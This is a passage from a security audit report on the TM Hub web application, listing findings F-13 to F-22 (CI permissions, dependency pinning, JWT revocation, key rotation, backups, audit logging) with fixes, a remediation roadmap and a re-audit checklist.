- uses: actions/setup-node@1e60f620b9541d16bece96c5465dc8ee9832be0b  # v4.0.3
```

Use `ratchet` or `pin-github-action` to automate the pinning + comment annotation.

```yaml
# .github/dependabot.yml — new file
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
```

**Verification**
- `git diff .github/workflows/deploy.yml` shows SHAs.
- Workflow runs successfully after pinning.

**Defense in depth**
- F-14 (permissions block) limits blast radius of any compromised action.
- Use OIDC for deploy creds where possible (Coolify doesn't support OIDC, so this stays a static token).

---

### F-14: Workflow missing `permissions:` block — implicit broad `GITHUB_TOKEN`

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N` = **5.4**
- **CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **OWASP:** A05:2021
- **Location:** `.github/workflows/deploy.yml:1-41`

**What's wrong**
With no top-level `permissions:` block, `GITHUB_TOKEN` defaults to **read/write** on contents, issues, PRs, etc. Any compromised action (F-13) can push commits, comment on issues, or modify the repo.

**Fix**

```yaml
# .github/workflows/deploy.yml — add at top level
name: Deploy to Coolify
on:
  push:
    branches: [master]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test: ...
  deploy: ...
```

If any step needs more (e.g. issue comments), grant per-job: `permissions: { issues: write }`.

**Verification**
- Run workflow; `GITHUB_TOKEN` scope visible in the run summary is `contents:read` only.

**Defense in depth**
- Branch protection on `master` (require PR review + status checks). If not yet enabled — enable it.
- Required signed commits or status checks before push.

---

### F-15: APScheduler 4.0.0a5 alpha in production

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:H` = **3.4**
- **CWE:** CWE-1104 (Use of Unmaintained Third-Party Components — adapted)
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **Location:** `pyproject.toml:12`, `Dockerfile:19`

**What's wrong**
APScheduler 4.0 is in pre-release. Pre-release versions:
- May have undisclosed/unfixed CVEs without a release-notes pipeline.
- Can break on minor version bumps without semver guarantees.

For TM Hub's scheduler this is the orchestrator of every refresh job (data, stats, avatars). Breakage = stale data; subtle bugs = race conditions.

**Fix**
Pin the version and add a release-watch tracker. When 4.0 GA ships:

```toml
# pyproject.toml
"apscheduler>=4.0.0,<4.1.0",
```

In the meantime, pin to the **exact** alpha currently working:

```toml
"apscheduler==4.0.0a5",
```

and remove `--pre "apscheduler>=4.0.0a5"` from `Dockerfile:19` (let lockfile drive).

**Verification**
- `uv lock` shows pinned alpha version.
- All tests pass.

**Defense in depth**
- Subscribe to APScheduler GH releases. Or add Renovate/Dependabot to track.

---

### F-16: No JWT revocation mechanism

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N` = **5.0** (only matters after a token leak)
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **OWASP:** A07:2021
- **Location:** `api/auth.py:30-36` (decode), `api/admin.py:62-80` (issue)

**What's wrong**
JWTs are stateless and only expire via `exp` (24h). If a token is leaked (F-03 chain), it's valid until `iat + 24h` — there's no server-side revocation.

**Fix**
Add a small `revoked_jwts` table keyed on `jti` (JWT ID) with TTL = max remaining `exp`. On every `decode_jwt`, check if `payload["jti"]` is in the revoked set.

Steps:
1. Add `jti` claim in `create_jwt`: `payload["jti"] = secrets.token_urlsafe(8)`.
2. Add `RevokedJwtRepository` storing `(jti, expires_at)`.
3. In `decode_jwt` (or in a dependency wrapper), reject if `jti` is revoked.
4. New endpoint `POST /api/logout`: stores caller's `jti` in revocations.
5. Periodic cleanup job (already have scheduler) to drop entries past `expires_at`.

**Verification**
- `POST /api/logout` then call `/api/me` with the same JWT → 401.
- Revoked entries auto-cleaned after `exp`.

**Defense in depth**
- Shorter `exp` (4h) + refresh-token flow (longer-lived refresh stored HttpOnly).
- Per-user "revoke all" endpoint reachable from the user's profile.

---

### F-17: Rate limiter unbounded memory growth

- **Severity:** **Low**
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` = **2.7**
- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **OWASP:** A04:2021 Insecure Design
- **Location:** `api/auth.py:54-71`

**What's wrong**
`RateLimiter._requests` is a `dict[str, list[float]]` that accumulates one entry per unique key (per IP for `/api/keys`, per player_id for admin). The per-key list is pruned of stale timestamps on access, but the **outer dict never evicts dead keys**. Long-running production accumulates entries indefinitely.

**Fix**

```python
# api/auth.py — periodic eviction in check()
class RateLimiter:
    def __init__(self) -> None:
        self._requests: dict[str, list[float]] = {}
        self._last_evict = time.time()

    def check(self, key: str, max_requests: int, window_seconds: int = 60) -> bool:
        now = time.time()
        # Evict every 5 min
        if now - self._last_evict > 300:
            cutoff = now - window_seconds
            self._requests = {k: v for k, v in self._requests.items() if any(t > cutoff for t in v)}
            self._last_evict = now
        # ... rest unchanged
```

**Verification**
- Synthetic test: feed 10 000 unique keys, observe `len(self._requests)` drops back near zero after eviction window.

**Defense in depth**
- Move to Redis-backed limiter when the app grows beyond single instance (it's currently single-host on Coolify).

---

### F-18: `data/keys.db` backup strategy undocumented

- **Severity:** **Medium**
- **CVSS v3.1:** N/A (operational risk, not direct CVE)
- **CWE:** CWE-1188 (Insecure Default Initialization of Resource — adapted)
- **OWASP:** A04:2021
- **Location:** `docker-compose.yml:14`

**What's wrong**
The encrypted database lives in a Docker volume (`hub-data:/app/data`). Loss of the volume = loss of all members' encrypted API keys (forcing every member to re-register). Compromise of the volume *and* leak of `ENCRYPTION_KEY` = full key disclosure. There's no documented backup, rotation, or off-site copy.

**Fix**
Document and implement:

1. **Daily snapshot job** — APScheduler job that gzips `data/keys.db`, encrypts with a *separate* backup key (different from `ENCRYPTION_KEY`), uploads to B2 (already configured). Retention: 30 days rolling.
2. **Restore runbook** — `docs/RUNBOOK_RESTORE.md`: how to fetch the latest backup, decrypt, restore the volume.
3. **Periodic restore drill** — quarterly: restore to a staging container, verify all keys decrypt, sample 5 random keys, confirm Torn API still accepts them.

**Verification**
- Backup job runs daily; B2 bucket shows daily archives.
- Quarterly drill passes.

**Defense in depth**
- Cross-region backup target.
- Encrypt backups with a key held by a different person (split control).

---

### F-19: No audit trail for admin actions

- **Severity:** **Low**
- **CVSS v3.1:** `AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:N/E:U` = **1.4** (forensics gap)
- **CWE:** CWE-778 (Insufficient Logging)
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **Location:** `api/admin.py:151-166` (promote/demote), `api/admin.py:94-99` (delete key), `api/admin.py:193-213` (announcements)

**What's wrong**
Admin actions go to Python `logger.info()` — fine for live debugging, but logs rotate, aren't structured, and don't survive a Coolify redeploy. There's no DB-backed audit log: "who promoted whom, when".

**Fix**
Add `audit_log` table:

```sql
CREATE TABLE IF NOT EXISTS audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts INTEGER NOT NULL,
  actor_id INTEGER NOT NULL,
  actor_role TEXT NOT NULL,
  action TEXT NOT NULL,
  target_type TEXT,
  target_id INTEGER,
  details_json TEXT
);
```

Insert rows from `promote_admin`, `demote_admin`, `delete_key`, `create_announcement`, `revoke_announcement`, `update_setting`, `create_session`. Expose `GET /api/admin/audit` (admin-only, paginated).

**Verification**
- Promote a test admin, see row in `audit_log`.
- Endpoint paginates 50/page.

**Defense in depth**
- Append-only constraint via trigger (`BEFORE UPDATE/DELETE → ROLLBACK`).
- Mirror to external log shipping (e.g. write to a file that Coolify forwards to a log aggregator).

---

### F-20: Encryption key & JWT secret without rotation procedure

- **Severity:** **Low**
- **CVSS v3.1:** N/A (operational hygiene)
- **CWE:** CWE-321 (Use of Hard-coded Cryptographic Key — adapted: env-var, not hard-coded, but no rotation)
- **OWASP:** A02:2021
- **Location:** `api/config.py:17-24, 28-35`

**What's wrong**
`ENCRYPTION_KEY` (Fernet) and `JWT_SECRET` (HS256) are env-vars set once at deploy. If either leaks, every encrypted key in `data/keys.db` and every active JWT is compromised — and there's no documented rotation procedure.

**Fix (Fernet rotation)**
Fernet supports key rotation via `MultiFernet`:

```python
# api/db/repos/keys.py
from cryptography.fernet import Fernet, MultiFernet

# config.py: support comma-separated keys; first = current encryption key
_keys = [k.strip() for k in os.environ.get("ENCRYPTION_KEYS", os.environ.get("ENCRYPTION_KEY", "")).split(",") if k.strip()]
ENCRYPTION_FERNET = MultiFernet([Fernet(k.encode()) for k in _keys])
```

Procedure:
1. Generate new key, set `ENCRYPTION_KEYS=<new>,<old>` (new first).
2. Run a one-off script that decrypts every row with `MultiFernet` and re-encrypts (which uses the first key by default).
3. After all rows are re-encrypted, drop `<old>` from env: `ENCRYPTION_KEYS=<new>`.

**Fix (JWT secret rotation)**
Issue new JWTs with new secret; accept both old and new during a 24h overlap; then drop old. Implement in `decode_jwt` to try both secrets.

**Verification**
- Rotation drill in staging: rotate, all members still authenticate, all keys still decrypt.

**Defense in depth**
- Quarterly key-rotation calendar.
- Separate key per concern (encryption key for Fernet ≠ JWT secret).

---

### F-21: `npm audit` — postcss < 8.5.10 (transitive)

- **Severity:** **Low**
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = **6.1** (per advisory) → effective **Low** in TM Hub
- **CWE:** CWE-79
- **OWASP:** A06:2021
- **Advisory:** GHSA-qx2v-qp2m-jg93 ("PostCSS has XSS via Unescaped `</style>` in CSS Stringify Output")
- **Location:** `frontend/node_modules/postcss/8.5.8`, `frontend/node_modules/next/node_modules/postcss/8.4.31`

**Why this is Low for TM Hub**
The advisory only matters when postcss processes attacker-controlled CSS at runtime. TM Hub uses postcss only at *build time* on author-controlled Tailwind/CSS — there is no user-uploaded CSS path. The bundled output is static.

**Fix**
Upgrade transitive postcss when Next ships an updated dep:

```bash
cd frontend
npm update postcss   # bumps top-level to ≥8.5.10
# Wait for next minor of next.js to bump its bundled postcss
```

If transitive nesting persists, an `overrides` block in `package.json` forces resolution:

```json
"overrides": { "postcss": "^8.5.10" }
```

**Verification**
- `cd frontend && npm audit --omit=dev` shows zero vulnerabilities.

**Defense in depth**
- Renovate/Dependabot weekly to surface upstream upgrades.

---

### F-22: `logger.exception()` includes full traceback

- **Severity:** **Info**
- **CVSS v3.1:** N/A
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Location:** `api/main.py:389, 623`

**What's wrong (and why this is Info)**
`logger.exception()` includes full traceback in logs. The HTTP response body is generic (no traceback to client) per FastAPI default, which is correct. Tracebacks are only in stdout logs, which Coolify ships internally — no public exposure. This is not a current vulnerability, just a hygiene note.

**Fix (optional)**
If logs ever ship to a third-party aggregator, scrub PII first. For now: confirm logs are *not* publicly browseable (Coolify default: not).

**Verification**
- Curl an error path; confirm response body has only `{"detail": "..."}`, no traceback.
- Check Coolify log retention and access ACL.

---

## Hardening recommendations (not tied to specific findings)

These are best-practice improvements; not required to ship the next feature, but raise the baseline:

- **HSTS preload** — current header is `max-age=63072000; includeSubDomains`. Add `; preload` and submit to https://hstspreload.org once you're confident no http-only subdomain exists under `tri.ovh`.
- **Referrer-Policy** — already `strict-origin-when-cross-origin`. Consider tightening to `same-origin` for internal pages.
- **Cookie flags** — N/A while tokens are in `localStorage`; becomes critical after F-03 fix.
- **WebSocket origin check** — `api/routers/chat.py` should verify `request.headers["origin"]` matches `hub.tri.ovh` before accepting upgrade.
- **`ruff` security ruleset** — enable `S` ruleset (Bandit-like) in pre-commit.
- **`semgrep --config=auto api/`** — add to CI as advisory (allow failure for now), surfaces patterns the audit might miss.
- **Pre-commit gitleaks hook** — block accidental secret commits at commit time.
- **`.dockerignore`** — verify it excludes `data/`, `.env`, `node_modules`, tests; otherwise the build context leaks them into image layers.
- **Branch protection on `master`** — require PR review + green checks (ties into F-14).
- **Periodic re-audit** — repeat this audit quarterly or after any major architectural change (new auth provider, new external API integration).

---

## Remediation roadmap

Effort estimates assume a single engineer familiar with the codebase.

### Sprint 0 (Critical, target: this week — ~6h)

| ID | Title | Effort |
|---|---|---|
| F-01 | IDOR `/api/enemy?baseline_pid` | 1h |
| F-02 | IDOR stats snapshots/growth | 2h |
| F-04 | dangerouslySetInnerHTML sanitiser | 1h |
| F-09 | `rel="noopener noreferrer"` (5 spots + ESLint rule) | 1h |
| Verification + tests | regression tests for above | 1h |

### Sprint 1 (High, next 2 weeks — ~3d)

| ID | Title | Effort |
|---|---|---|
| F-03 + F-08 | HttpOnly cookies + nonce CSP (paired) | 1d |
| F-05 | `SUPERADMIN_IDS` env-var | 4h |
| F-06 | Admin re-auth on escalation | 4h |
| F-07 | Drop `'unsafe-inline'` from script-src | 4h (verify after F-04) |

### Sprint 2 (Medium, this quarter — ~5d)

| ID | Title | Effort |
|---|---|---|
| F-10 | Refactor f-string SQL in 3 repos | 4h |
| F-11 | Docker non-root user | 2h |
| F-12 | Umami SRI or self-host | 1h |
| F-13 | SHA-pin Actions + dependabot | 2h |
| F-14 | Workflow `permissions:` block | 30m |
| F-15 | APScheduler version pin watch | 1h |
| F-16 | JWT revocation table + endpoint | 1d |
| F-18 | Backups + runbook + drill | 1d |

### Sprint 3 (Low / Info, opportunistic — ~2d)

| ID | Title | Effort |
|---|---|---|
| F-17 | Rate-limiter eviction | 1h |
| F-19 | Audit log table + endpoint | 1d |
| F-20 | MultiFernet + JWT rotation runbook | 1d |
| F-21 | Watch postcss upgrade | passive |
| F-22 | Verify log retention ACL | 30m |

---

## Re-audit checklist

After fixes ship, verify the following before declaring "audit closed":

- [ ] **F-01 / F-02:** Regression tests added in `tests/test_routes.py`; cross-player IDOR returns 403.
- [ ] **F-03 / F-08:** `localStorage` no longer contains `sessionToken`/`adminToken` (DevTools); CSP no longer contains `'unsafe-inline'` for `script-src`.
- [ ] **F-04:** Search `frontend/src/` for `dangerouslySetInnerHTML` — every match either uses `DOMPurify.sanitize` or has a comment justifying why content is trusted.
- [ ] **F-05:** `SUPERADMIN_IDS` env-var documented in CLAUDE.md; allowlist tested with two IDs.
- [ ] **F-06:** Test stolen-token escalation scenario passes (Torn key revoked → escalation 401).
- [ ] **F-09:** ESLint rule active; `npm run lint` clean.
- [ ] **F-10:** `grep -rE "\.mutate\(f\"" api/db/repos/` returns nothing.
- [ ] **F-11:** `docker exec ... id` shows non-root.
- [ ] **F-12:** SRI hash in HTML; manually breaking the hash blocks the script.
- [ ] **F-13 / F-14:** All workflow steps SHA-pinned; `permissions: contents: read` at top.
- [ ] **F-16:** `POST /api/logout` revokes; subsequent `/api/me` with same JWT returns 401.
- [ ] **F-17:** Synthetic load test confirms `_requests` dict bounded.
- [ ] **F-18:** Latest backup visible in B2; restore drill performed.
- [ ] **F-19:** Promote-admin action visible in `audit_log`; `/api/admin/audit` paginates.
- [ ] **F-20:** Rotation drill in staging passes for both Fernet and JWT.
- [ ] **F-21:** `npm audit --omit=dev` zero vulnerabilities.

After all checks pass, re-run static scans (`uvx pip-audit`, `npm audit`, optional `semgrep --config=auto`) and confirm no new findings.

---

## Coverage matrix — methodology obszar × finding

| Obszar (z metodyki) | Findings | Status |
|---|---|---|
| 1. Authentication & Session | F-05, F-06, F-15, F-16, F-20 | Reviewed; HS256 JWT validated; rate limit OK |
| 2. Authorization | F-01, F-02 | **Two Critical IDOR**; admin escalation gap (F-06) |
| 3. Injection | F-10 | No exploitable injection; pattern smell only |
| 4. XSS / client-side | F-04, F-07, F-08 | DOM XSS risk, CSP gap |
| 5. CSRF / SSRF / smuggling | — | No SSRF (URLs hardcoded); CSRF mitigated by SameSite once F-03 lands |
| 6. Cryptography | F-20 | Fernet at rest ✓, HS256 alg-pinned ✓; rotation gap |
| 7. Deserialization & file handling | — | No upload, no XML parsing, path traversal protected (`_resolve_static_path`) |
| 8. API & business logic | F-01, F-02, F-06 | IDOR + escalation; no race conditions found in critical paths |
| 9. Dependencies & supply chain | F-13, F-15, F-21 | Python clean; one transitive Node moderate |
| 10. Secrets & configuration | F-05, F-12, F-20 | No leaked secrets in repo or git history |
| 11. Infra & deployment | F-11, F-12, F-13, F-14, F-18 | Container as root; CI hardening gaps; backups undocumented |
| 12. Logging, monitoring, IR | F-19, F-22 | No audit trail; logs OK |
